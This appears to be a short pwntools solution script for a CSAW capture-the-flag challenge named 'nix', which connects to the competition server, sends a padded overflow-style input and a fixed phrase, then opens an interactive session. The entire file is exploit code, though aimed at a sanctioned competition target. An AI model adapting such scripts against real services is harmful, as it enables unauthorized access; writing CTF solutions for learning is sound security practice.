from pwn import *
import time
bin = './chal'
elf = context.binary = ELF(bin)
#p = process(bin)
p = remote('nix.ctf.csaw.io', 1000)
payload = b'AAAAAAAAAAAAAAAAAAAAAAAAA,'
p.sendlineafter(b'philosophies: ', payload)
time.sleep(1)
p.sendline(b'make every program a filter')
p.interactive()